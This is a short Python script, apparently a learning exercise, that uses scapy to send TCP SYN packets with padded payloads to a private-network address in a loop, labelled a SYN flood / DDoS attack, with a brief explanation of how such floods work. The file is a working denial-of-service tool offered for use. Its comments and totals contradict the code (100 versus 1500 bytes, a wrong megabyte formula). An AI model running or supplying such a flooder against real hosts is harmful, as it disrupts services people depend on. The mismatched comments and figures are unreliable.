'''SYN Flood Attack: SYN flood attacks exploit the three-way handshake process in TCP. Attackers send a flood of TCP SYN (synchronization) 
packets to the target, causing it to allocate resources for incomplete connections and eventually leading to a system overload'''

#DDOS SYNC ATTACK
import sys
import time
from scapy.all import *

target_ip = "10.0.2.15"
target_port = 8080  # Initialize the target port as an integer

# Track the number of packets sent
packet_count = 0

def send_syn_packet(target_ip, target_port):
    global packet_count  # Access the packet_count variable

    # Create a packet with the SYN flag set and 100 bytes of payload
    payload = b"A" * 1500  # Create a payload of 100 bytes filled with 'A'
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S") / Raw(load=payload)

    # Send the packet
    send(packet, verbose=0)
    
    # Increment the packet count
    packet_count += 1

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python syn_flood.py <target_port>")
        sys.exit(1)

    target_port = int(sys.argv[1])  # Parse the target port from the command line argument

    print("Syn flood started, press Ctrl+C to stop...")

    try:
        while True:
            send_syn_packet(target_ip, target_port)
            time.sleep(1)  # Delay for 1 second between sending packets
    except KeyboardInterrupt:
        print("\nSyn flood stopped.")
        print(f"Total data transferred to target system: {packet_count * 1500} bytes")  # Total data size is now 100 bytes per packet
        print(f"Total data in MegaBytes : {(packet_count * 10000)/1000000} mb")